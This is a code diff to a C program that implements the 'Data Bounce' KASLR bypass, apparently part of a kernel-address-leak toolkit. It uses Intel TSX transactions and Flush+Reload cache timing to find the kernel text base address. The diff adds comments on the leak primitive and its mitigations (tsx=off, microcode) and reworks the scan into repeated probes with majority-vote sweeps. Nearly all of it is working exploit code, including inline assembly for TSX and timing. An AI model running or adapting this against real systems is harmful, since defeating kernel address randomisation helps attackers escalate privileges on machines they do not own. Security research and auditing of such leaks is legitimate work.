@@ -27,6 +27,19 @@
 // Martin Schwarzl, and Daniel Gruss:
 // "KASLR: Break It, Fix It, Repeat" (Asia CCS 2020)
 //
+// Leak primitive:
+//   Data leaked:      kernel text virtual base address
+//   Kernel subsystem: arch/x86 — TSX store-to-load forwarding side-channel
+//   Data structure:   kernel text mapping (store buffer forwarding)
+//   Address type:     virtual (kernel text)
+//   Method:           timing (Flush+Reload on probe array)
+//   Status:           unfixed on TSX-capable hardware
+//
+// Mitigations:
+//   TSX disabled (tsx=off boot param, microcode update, or
+//   CONFIG_X86_INTEL_TSX_MODE_OFF) prevents the attack entirely.
+//   Non-Intel CPUs lack TSX and are immune. KPTI does not mitigate.
+//
 // References:
 // https://cc0x1f.net/publications/kaslr.pdf
 // https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
@@ -56,23 +69,13 @@
  * =========================================================================
  */
 
-/* Number of interleaved iterations over the full scan window. Each
- * address is probed once per iteration, and cache hits are accumulated.
- *
- * Uses the same statistical approach as entrybleed/echoload: many
- * interleaved iterations to smooth noise, followed by unanimity
- * verification. Flush+Reload is self-resetting (clflush at the end of
- * each probe), so repeated iterations do not accumulate cache state. */
-#define DATABOUNCE_ITERATIONS 100
-#define DATABOUNCE_WARMUP 5
+/* Number of back-to-back probes per candidate address. If any single
+ * probe produces a cache hit, the address is considered mapped. */
+#define DATABOUNCE_REPS 10
 
-/* Minimum number of cache hits (out of DATABOUNCE_ITERATIONS) for an
- * address to be considered mapped. */
-#define DATABOUNCE_HIT_THRESHOLD 50
-
-/* Number of verification sweeps. The initial sweep result must match
- * all verification sweeps exactly (unanimity check). */
-#define DATABOUNCE_VERIFY 3
+/* Total number of independent sweeps. The most frequently returned
+ * non-zero address wins if it appears in a majority of sweeps. */
+#define DATABOUNCE_SWEEPS 7
 
 /* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
 #define SCAN_STEP (KERNEL_ALIGN)
@@ -82,6 +85,20 @@
 /* The sentinel value written transiently to the kernel address. The
  * Flush+Reload oracle checks probe['X' * 4096]. */
 #define BOUNCE_CHAR 'X'
+
+KASLD_EXPLAIN(
+    "Data Bounce exploits Intel TSX (Transactional Synchronization "
+    "Extensions) store-to-load forwarding: inside a TSX transaction, a "
+    "store to a kernel address followed by a load from the same address "
+    "forwards the stored value without faulting, but only for mapped "
+    "pages. By scanning KASLR candidate addresses with Flush+Reload "
+    "as the oracle, mapped kernel text pages are identified. Mitigated "
+    "by disabling TSX (tsx=off, microcode update, or "
+    "CONFIG_X86_INTEL_TSX_MODE_OFF).");
+
+KASLD_META("method:timing\n"
+           "addr:virtual\n"
+           "hardware:TSX required (mitigated by tsx=off)\n");
 
 /* =========================================================================
  * Timing primitives (x86_64 only)
@@ -98,7 +115,7 @@
 
 static size_t cache_miss_threshold;
 
-static inline uint64_t rdtscp_time(void) {
+static inline __attribute__((always_inline)) uint64_t rdtscp_time(void) {
   uint64_t lo, hi;
   __asm__ volatile("mfence\n\t"
                    "rdtscp\n\t"
@@ -111,11 +128,11 @@ static inline uint64_t rdtscp_time(void) {
   return (hi << 32) | lo;
 }
 
-static inline void maccess(volatile void *p) {
+static inline __attribute__((always_inline)) void maccess(volatile void *p) {
   __asm__ volatile("movq (%0), %%rax" : : "c"(p) : "rax");
 }
 
-static inline void flush(volatile void *p) {
+static inline __attribute__((always_inline)) void flush(volatile void *p) {
   __asm__ volatile("clflush 0(%0)" : : "c"(p) : "rax");
 }
 
@@ -168,7 +185,7 @@ static int has_rtm(void) {
   return 0;
 }
 
-static inline unsigned int xbegin_wrapper(void) {
+static inline __attribute__((always_inline)) unsigned int xbegin_wrapper(void) {
   unsigned int status;
   __asm__ volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                    : "=a"(status)
@@ -177,11 +194,11 @@ static inline unsigned int xbegin_wrapper(void) {
   return status;
 }
 
-static inline void xend_wrapper(void) {
+static inline __attribute__((always_inline)) void xend_wrapper(void) {
   __asm__ volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
 }
 
-static inline void xabort_wrapper(void) {
+static inline __attribute__((always_inline)) void xabort_wrapper(void) {
   __asm__ volatile(".byte 0xc6,0xf8,0x00" ::: "memory");
 }
 
@@ -235,44 +252,36 @@ static char __attribute__((aligned(4096))) probe[4096 * 256];
  * Scans [KERNEL_BASE_MIN, KERNEL_BASE_MAX) and returns the lowest
  * confirmed mapped address, or 0 if nothing was found.
  *
- * Uses interleaved iteration: visit every candidate address once per
- * iteration, repeat DATABOUNCE_ITERATIONS times, and accumulate
- * per-slot hit counts.
+ * Tests each candidate address independently with DATABOUNCE_REPS
+ * back-to-back probes, returning on the first cache hit. This avoids
+ * cross-address cache pollution from interleaved scanning.
  */
 static unsigned long databounce_sweep(void) {
-  int hits[SCAN_SLOTS];
-  memset(hits, 0, sizeof(hits));
+  /* Pre-flush all 256 probe lines before the scan, matching the
+   * reference implementation. */
+  for (int i = 0; i < 256; i++)
+    flush(probe + i * 4096);
 
-  for (int iter = 0; iter < DATABOUNCE_ITERATIONS + DATABOUNCE_WARMUP; iter++) {
-    volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;
+  volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;
 
-    for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
-      flush(probe + BOUNCE_CHAR * 4096);
-
+  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
+    for (int rep = 0; rep < DATABOUNCE_REPS; rep++) {
       if (xbegin_wrapper() == ~0u) {
         maccess(0);
         *buffer = BOUNCE_CHAR;
-        /* NOP sled improves accuracy — gives the store buffer time to
-         * forward the value before the transaction aborts. */
         __asm__ volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
                          "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop");
         maccess(probe + *(volatile char *)buffer * 4096);
-        xabort_wrapper();
+        xend_wrapper();
       }
-      xend_wrapper();
 
-      if (iter >= DATABOUNCE_WARMUP && flush_reload(probe + BOUNCE_CHAR * 4096))
-        hits[slot]++;
-
-      buffer += SCAN_STEP;
+      if (flush_reload(probe + BOUNCE_CHAR * 4096))
+        return KERNEL_BASE_MIN + slot * SCAN_STEP;
     }
+
+    buffer += SCAN_STEP;
   }
 
-  /* Return the lowest address above the hit threshold */
-  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
-    if (hits[slot] >= DATABOUNCE_HIT_THRESHOLD)
-      return KERNEL_BASE_MIN + slot * SCAN_STEP;
-  }
   return 0;
 }
 
@@ -313,21 +322,33 @@ int main(void) {
   CPU_SET(1, &set);
   sched_setaffinity(0, sizeof(set), &set);
 
-  unsigned long addr = databounce_sweep();
+  /* Run multiple sweeps and take the address that appears most often.
+   * An intermittent signal may cause individual sweeps to miss, so
+   * majority-vote is more robust than strict unanimity. */
+  unsigned long results[DATABOUNCE_SWEEPS];
+  for (int s = 0; s < DATABOUNCE_SWEEPS; s++)
+    results[s] = databounce_sweep();
 
-  if (!addr) {
+  unsigned long addr = 0;
+  int best_count = 0;
+  for (int i = 0; i < DATABOUNCE_SWEEPS; i++) {
+    if (!results[i])
+      continue;
+    int count = 0;
+    for (int j = 0; j < DATABOUNCE_SWEEPS; j++) {
+      if (results[j] == results[i])
+        count++;
+    }
+    if (count > best_count) {
+      best_count = count;
+      addr = results[i];
+    }
+  }
+
+  if (!addr || best_count < (DATABOUNCE_SWEEPS + 1) / 2) {
     fprintf(stderr, "[-] databounce: no kernel mapping detected "
                     "(CPU may not be vulnerable)\n");
     return 0;
-  }
-
-  /* Unanimity verification: repeat the full sweep and require every result to
-   * match. If any sweep disagrees, the result is rejected entirely. */
-  for (int v = 0; v < DATABOUNCE_VERIFY; v++) {
-    if (addr != databounce_sweep()) {
-      fprintf(stderr, "[-] databounce: inconsistent results. Aborting ...\n");
-      return 0;
-    }
   }
 
   bool pti = detect_kpti();
